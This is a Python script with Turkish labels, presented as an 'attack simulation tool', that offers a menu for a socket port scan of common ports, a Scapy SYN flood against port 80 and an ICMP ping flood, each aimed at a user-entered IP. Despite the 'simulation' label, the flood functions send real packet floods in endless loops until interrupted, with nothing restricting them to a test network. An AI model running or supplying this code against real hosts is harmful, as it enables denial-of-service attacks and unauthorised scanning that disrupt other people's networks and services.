import socket
import time
import random
import sys
# Scapy kütüphanesi
from scapy.all import IP, TCP, ICMP, send

def menu_yazdir():
    print("\n" + "="*40)
    print("   SALDIRI SİMÜLASYON ARACI")
    print("="*40)
    print("1. Port Tarama (Socket ile)")
    print("2. SYN Flood Simülasyonu (Scapy ile)")
    print("3. ICMP Flood Simülasyonu (Scapy ile)")
    print("4. Çıkış")
    print("="*40)

def port_tarama(hedef_ip):
    print(f"\n[*] {hedef_ip} taranıyor...")
    portlar = [21, 22, 80, 443, 3306, 8080]
    
    for port in portlar:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1) # Hızlı tarama için süre kısa
            sonuc = s.connect_ex((hedef_ip, port))
            if sonuc == 0:
                print(f"[+] Port {port}: AÇIK")
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Tarama durduruldu.")
            break
        except:
            pass
    print("[*] Tarama bitti.")

def syn_flood_simulasyonu(hedef_ip):
    print(f"\n[*] {hedef_ip} hedefine SYN Flood başlatılıyor...")
    print("[!] Durdurmak için CTRL+C'ye basınız.")
    time.sleep(1)
    
    try:
        while True:
            sahte_port = random.randint(1024, 65535)
            # Sahte kaynak IP (IP Spoofing) yapmıyoruz çünkü dönen cevapları görmek isteyebiliriz,
            # ama saldırı simülasyonu için normal IP yeterli.
            
            # 'S' bayrağı SYN anlamına gelir
            pkt = IP(dst=hedef_ip)/TCP(sport=sahte_port, dport=80, flags="S")
            send(pkt, verbose=0)
            
            # Çok hızlı gönderim için sleep süresini kıstık
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print("\n[*] Saldırı durduruldu.")

def icmp_flood_simulasyonu(hedef_ip):
    print(f"\n[*] {hedef_ip} hedefine ICMP (Ping) Flood başlatılıyor...")
    print("[!] Durdurmak için CTRL+C'ye basınız.")
    time.sleep(1)
    
    try:
        while True:
            pkt = IP(dst=hedef_ip)/ICMP()
            send(pkt, verbose=0)
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print("\n[*] Saldırı durduruldu.")

if __name__ == "__main__":
    while True:
        menu_yazdir()
        secim = input("Seçiminiz: ")
        
        if secim == '4':
            print("Güle güle...")
            break
        
        if secim in ['1', '2', '3']:
            hedef_ip = input("Hedef IP Adresi (Örn: 192.168.1.XX): ")
            
            if secim == '1':
                port_tarama(hedef_ip)
            elif secim == '2':
                syn_flood_simulasyonu(hedef_ip)
            elif secim == '3':
                icmp_flood_simulasyonu(hedef_ip)
        else:
            print("[!] Geçersiz seçim.")